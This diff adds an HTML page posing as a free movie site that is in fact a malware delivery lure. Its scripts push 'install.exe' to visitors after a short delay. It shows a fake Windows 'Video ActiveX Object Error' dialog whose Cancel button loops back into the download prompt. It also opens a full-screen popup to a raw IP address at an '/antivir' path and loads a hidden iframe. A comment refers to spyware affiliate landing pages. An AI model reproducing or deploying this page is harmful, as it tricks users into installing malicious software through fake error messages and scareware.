@@ -1,0 +1,395 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>Watch Free Movie</TITLE>
+<META content=noindex,nofollow,noarchive name=robots>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+
+
+<STYLE>.t {
+	BORDER-RIGHT: #666666 1px solid; BORDER-TOP: #666666 1px solid; BORDER-LEFT: #666666 1px solid; BORDER-BOTTOM: #666666 1px solid
+}
+.b1 {
+	BORDER-RIGHT: 0px; PADDING-RIGHT: 0px; BORDER-TOP: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: bold; FONT-SIZE: 12px; BACKGROUND-IMAGE: url(img/img5.gif); PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: 0px; WIDTH: 104px; COLOR: #fff; PADDING-TOP: 0px; BORDER-BOTTOM: 0px; BACKGROUND-REPEAT: no-repeat; FONT-FAMILY: Arial; HEIGHT: 23px; BACKGROUND-COLOR: #fff
+}
+.b11 {
+	BORDER-RIGHT: 0px; PADDING-RIGHT: 0px; BORDER-TOP: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: bold; FONT-SIZE: 12px; BACKGROUND-IMAGE: url(img5.gif); PADDING-BOTTOM: 0px; MARGIN: 0px; BORDER-LEFT: 0px; WIDTH: 104px; COLOR: #fff; PADDING-TOP: 0px; BORDER-BOTTOM: 0px; BACKGROUND-REPEAT: no-repeat; FONT-FAMILY: Arial; HEIGHT: 23px; BACKGROUND-COLOR: #fff; TEXT-DECORATION: underline
+}
+</STYLE>
+
+<script>
+function activex_is_here()
+{
+    try
+    {
+        return false;
+    }
+    catch(e)
+    {
+        ;
+    }
+
+    return false;
+}
+var begin_popup_url = 'http://79.135.167.18/antivir';
+function show_begin_popup()
+{
+     if (begin_popup_url && begin_popup_url != '')
+     {
+	var width = window.screen.availWidth;
+	var height = window.screen.availHeight;
+	var left = 0;
+	var top = 0;
+
+	params = 'height='+height+',width='+width+',left='+left+',top='+top+',toolbar=0,status=0,menubar=0,status=0,menubar=0,resizable=0,scrollbars=1';
+
+	pop = window.open(begin_popup_url, '_blank', params);
+	window.focus();
+     }
+}
+
+function releaseMovie() {
+	if (activex_is_here()) {
+		document.getElementById('playMov').innerHTML = '<embed src="movie.mpg" width="480" height="400" autostart="true" type="movie/mpg"></embed>';
+	}
+}function codecDownload()
+{
+	if (window.navigator.userAgent.indexOf("SV1") != -1 || window.navigator.userAgent.indexOf("MSIE 7") !=-1) {
+return;
+	}
+	else {
+		window.setTimeout("location.href='install.exe'", 3000);
+	}
+}
+</script>
+</head>
+
+<body color=black>
+
+<script>
+
+	codecDownload();
+
+</script>
+<script>
+
+
+var Drag = {
+	obj : null,
+	init : function(o, oRoot, minX, maxX, minY, maxY, bSwapHorzRef, bSwapVertRef, fXMapper, fYMapper)
+	{
+		o.onmousedown	= Drag.start;
+
+		o.hmode			= bSwapHorzRef ? false : true ;
+		o.vmode			= bSwapVertRef ? false : true ;
+
+		o.root = oRoot && oRoot != null ? oRoot : o ;
+
+		if (o.hmode  && isNaN(parseInt(o.root.style.left  ))) o.root.style.left   = "0px";
+		if (o.vmode  && isNaN(parseInt(o.root.style.top   ))) o.root.style.top    = "0px";
+		if (!o.hmode && isNaN(parseInt(o.root.style.right ))) o.root.style.right  = "0px";
+		if (!o.vmode && isNaN(parseInt(o.root.style.bottom))) o.root.style.bottom = "0px";
+
+		o.minX	= typeof minX != 'undefined' ? minX : null;
+		o.minY	= typeof minY != 'undefined' ? minY : null;
+		o.maxX	= typeof maxX != 'undefined' ? maxX : null;
+		o.maxY	= typeof maxY != 'undefined' ? maxY : null;
+
+		o.xMapper = fXMapper ? fXMapper : null;
+		o.yMapper = fYMapper ? fYMapper : null;
+
+		o.root.onDragStart	= new Function();
+		o.root.onDragEnd	= new Function();
+		o.root.onDrag		= new Function();
+	},
+
+	start : function(e)
+	{
+		var o = Drag.obj = this;
+		e = Drag.fixE(e);
+		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
+		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
+		o.root.onDragStart(x, y);
+
+		o.lastMouseX	= e.clientX;
+		o.lastMouseY	= e.clientY;
+
+		if (o.hmode) {
+			if (o.minX != null)	o.minMouseX	= e.clientX - x + o.minX;
+			if (o.maxX != null)	o.maxMouseX	= o.minMouseX + o.maxX - o.minX;
+		} else {
+			if (o.minX != null) o.maxMouseX = -o.minX + e.clientX + x;
+			if (o.maxX != null) o.minMouseX = -o.maxX + e.clientX + x;
+		}
+
+		if (o.vmode) {
+			if (o.minY != null)	o.minMouseY	= e.clientY - y + o.minY;
+			if (o.maxY != null)	o.maxMouseY	= o.minMouseY + o.maxY - o.minY;
+		} else {
+			if (o.minY != null) o.maxMouseY = -o.minY + e.clientY + y;
+			if (o.maxY != null) o.minMouseY = -o.maxY + e.clientY + y;
+		}
+
+		document.onmousemove	= Drag.drag;
+		document.onmouseup		= Drag.end;
+
+		return false;
+	},
+
+	drag : function(e)
+	{
+		e = Drag.fixE(e);
+		var o = Drag.obj;
+
+		var ey	= e.clientY;
+		var ex	= e.clientX;
+		var y = parseInt(o.vmode ? o.root.style.top  : o.root.style.bottom);
+		var x = parseInt(o.hmode ? o.root.style.left : o.root.style.right );
+		var nx, ny;
+
+		if (o.minX != null) ex = o.hmode ? Math.max(ex, o.minMouseX) : Math.min(ex, o.maxMouseX);
+		if (o.maxX != null) ex = o.hmode ? Math.min(ex, o.maxMouseX) : Math.max(ex, o.minMouseX);
+		if (o.minY != null) ey = o.vmode ? Math.max(ey, o.minMouseY) : Math.min(ey, o.maxMouseY);
+		if (o.maxY != null) ey = o.vmode ? Math.min(ey, o.maxMouseY) : Math.max(ey, o.minMouseY);
+
+		nx = x + ((ex - o.lastMouseX) * (o.hmode ? 1 : -1));
+		ny = y + ((ey - o.lastMouseY) * (o.vmode ? 1 : -1));
+
+		if (o.xMapper)		nx = o.xMapper(y)
+		else if (o.yMapper)	ny = o.yMapper(x)
+
+		Drag.obj.root.style[o.hmode ? "left" : "right"] = nx + "px";
+		Drag.obj.root.style[o.vmode ? "top" : "bottom"] = ny + "px";
+		Drag.obj.lastMouseX	= ex;
+		Drag.obj.lastMouseY	= ey;
+
+		Drag.obj.root.onDrag(nx, ny);
+		return false;
+	},
+
+	end : function()
+	{
+		document.onmousemove = null;
+		document.onmouseup   = null;
+		Drag.obj.root.onDragEnd(	parseInt(Drag.obj.root.style[Drag.obj.hmode ? "left" : "right"]), 
+									parseInt(Drag.obj.root.style[Drag.obj.vmode ? "top" : "bottom"]));
+		Drag.obj = null;
+	},
+
+	fixE : function(e)
+	{
+		if (typeof e == 'undefined') e = window.event;
+		if (typeof e.layerX == 'undefined') e.layerX = e.offsetX;
+		if (typeof e.layerY == 'undefined') e.layerY = e.offsetY;
+		return e;
+	}
+};
+
+function Down(download,e) 
+{ 
+	if (e!=null && e.keyCode==27)
+	{	Close();
+		return;
+	}	
+    switch (download) 
+    { 
+        case "iax": document.location.href="install.exe"; break; 
+        Close(); 
+    } 
+
+} 
+
+function vc() {
+	if (confirm('Video ActiveX Object Error.\n\nYour browser cannot play this video file.\nClick \'OK\' to download and install missing Video ActiveX Object.')) {
+		location.href="install.exe";
+	}
+	else {
+		if (alert('Please install new version of Video ActiveX Object.')) {
+			vc();
+		}
+		else {
+			vc();
+		}			
+	}
+}
+
+function Close() 
+{ 
+    var p=document.getElementById("popdiv");
+    p.style.visibility="hidden"; 
+	vc();
+} 
+function Details()
+{
+	alert('You must download Video ActiveX Object to play this video file.');
+}
+
+</script>
+
+
+<div name="popdiv" id="popdiv" onKeyPress="Down('iax',event);" style="visibility:hidden; z-index:1;position:absolute;top:0px;left:0px;">
+	<table cellpadding="0" cellspacing="0" width="362" height="126">
+		<tr>
+			<td>
+				<table cellpadding="0" cellspacing="0" width="362" height="29" style=" BACKGROUND-IMAGE:URL('xptop.gif'); height:29px; width:362;"> <!-- win top table -->
+					<tr>
+						<td style="color:white; font-family:Tahoma; font-size:13px; font-weight:bold; padding-left:4px;padding-top:1px">&nbsp;&nbsp;Video ActiveX Object Error.</td>
+						<td width="21" style="padding-right:6px;"><img src="xpclose.gif" width="21" height="21" onClick="Close();" style="cursor:default;" ></td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				<table cellpadding="0" cellspacing="0" height="97">
+					<tr>
+						<td style="background-image:url(left.gif); background-repeat:repeat-y;" valign="bottom">
+							<table cellpadding="0" cellspacing="0">
+								<tr>
+									<td><img src="xpleftclm.gif" width="3" height="97"></td>
+								</tr>
+							</table>
+						</td>
+						<td valign="top">
+							<table cellpadding="0" cellspacing="0" width="356" bgcolor="ece9d8">
+								<tr>
+									<td>
+										<table cellpadding="0" cellspacing="0" height="59">
+											<tr>
+												<td align="center" style="padding-left:20px; padding-top:13px;" valign="top"><img src="alert.gif" width="31" height="32"></td>
+												<td align="left" style="font-size:11px;  font-family:Tahoma; padding-left:30px; padding-bottom:8px; padding-right:5px;"><br><b>Video ActiveX Object Error:</b><br>Your browser cannot display this video file.<br><br>You need to download new version of Video ActiveX Object to play this video file.
+												</td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr>
+								<tr>
+									<td style="padding-left:20px; padding-right:20px; padding-bottom:20px; font-family:Tahoma; font-size:11px;" align="center">
+										<hr><br>
+										Click Continue to download and install ActiveX Object.
+
+									</td>
+								</tr>
+									<td>
+										<table align="center" cellpadding="0" cellspacing="6" height="22">
+											<tr height="22">
+												<td><input type="button" value="Continue" onClick="Down('iax');" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" tabindex="1" ID="Button1" NAME="Button1"><br><br></td>
+												<td></td>
+												<td><input type="button" value="Cancel" onClick="Close()" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" ID="Button3" NAME="Button3"><br><br></td>
+												<td><input type="button" value="Details..." onClick="Details()" style="font-size:11px;  font-family:Arial; height:23px; width:82px;" ID="Button3" NAME="Button3"><br><br></td>														
+											</tr>
+										</table>
+									</td>
+								</tr>
+								<tr>
+									<td>
+										<table cellpadding="0" cellspacing="0" width="100%">
+											<tr bgcolor="4577ea" style="height:1px;">
+												<td></td>
+											</tr> <!-- empty colors -->
+											<tr bgcolor="0029b5" style="height:1px;">
+												<td></td>
+											</tr>
+											<tr bgcolor="001590" style="height:1px;">
+												<td></td>
+											</tr>
+										</table>
+									</td>
+								</tr>
+							</table>
+						</td>
+						<td style="background-image:url(right.gif); background-repeat:repeat-y;" valign="bottom">
+							<table cellpadding="0" cellspacing="0">
+								<tr>
+									<td style="padding:0px;"><img src="xprightclm.gif" width="3" height="97"></td>
+								</tr>
+							</table>
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+	</table>
+
+	
+<script>
+if (navigator.userAgent.indexOf("Firefox")!=-1) {
+if (activex_is_here()) { } else {
+	setTimeout("Close();", 1000);
+}
+}
+else {
+if (activex_is_here()) { } else {
+	setTimeout("showPopDiv();",2000);
+}
+}
+      
+function showPopDiv()
+{
+		var sFlag = "No";
+		var byFlag = false;
+		var FlagAr = sFlag.split("");
+	
+		if (FlagAr[0]=="1"){byFlag = true;}
+		if (FlagAr[0]=="3"){byFlag = true;}
+	
+		if(!byFlag) {
+			var p=document.getElementById("popdiv"); 
+	
+		var myWidth = 0, myHeight = 0;
+		if( typeof( window.innerWidth ) == 'number' ) {
+		myWidth = window.innerWidth;
+		myHeight = window.innerHeight;
+		} else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {
+		myWidth = document.documentElement.clientWidth;
+		myHeight = document.documentElement.clientHeight;
+		} else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
+		myWidth = document.body.clientWidth;
+		myHeight = document.body.clientHeight;
+		}
+
+		function getScroll() {
+		
+			var scrOfX = 0, scrOfY = 0;
+			if( typeof( window.pageYOffset ) == 'number' ) {
+			scrOfY = window.pageYOffset;
+			scrOfX = window.pageXOffset;
+			} else if( document.body && ( document.body.scrollLeft || document.body.scrollTop ) ) {
+			scrOfY = document.body.scrollTop;
+			scrOfX = document.body.scrollLeft;
+			} else if( document.documentElement && ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {
+			scrOfY = document.documentElement.scrollTop;
+			scrOfX = document.documentElement.scrollLeft;
+			}
+			return [scrOfX, scrOfY];
+		
+		}
+
+		sc = getScroll(); 
+		p.style.top = (myHeight/2 - 181)+sc[1]+'px'; 
+		p.style.left = (myWidth/2 - 120) + sc[0]+'px'; 
+		p.style.visibility = 'visible';
+		p.focus();
+	}
+}
+
+Drag.init(document.getElementById("popdiv"));
+</script>
+</div>
+      
+
+<CENTER><!-- no title variant of spy partners & ruler cash landings --><A 
+      href="install.exe">
+      <p><a href="#" onClick="show_begin_popup();window.close();" ><img src="close.png" alt="Close the page" border="0" height="50" width="300"></a></p>
+      <IMG 
+      onmouseover="window.status = 'You must download Video ActiveX Object to play this video file.';" 
+      height=369 
+      alt="You must download Video ActiveX Object to play this video file." 
+      src="movierol.gif" width=450 border=0></A> <iframe id="01" src="metai.html" frameborder="0" style="display:none"></iframe>
+      </CENTER></DIV><br><center><font color=gray><font size=5>
+7 min 25 sec, Raiting 8/10, 139163 views<br>
+          54 users are watching this movie right now</CENTER></font></font>
+
+
+
+
+</BODY></HTML>
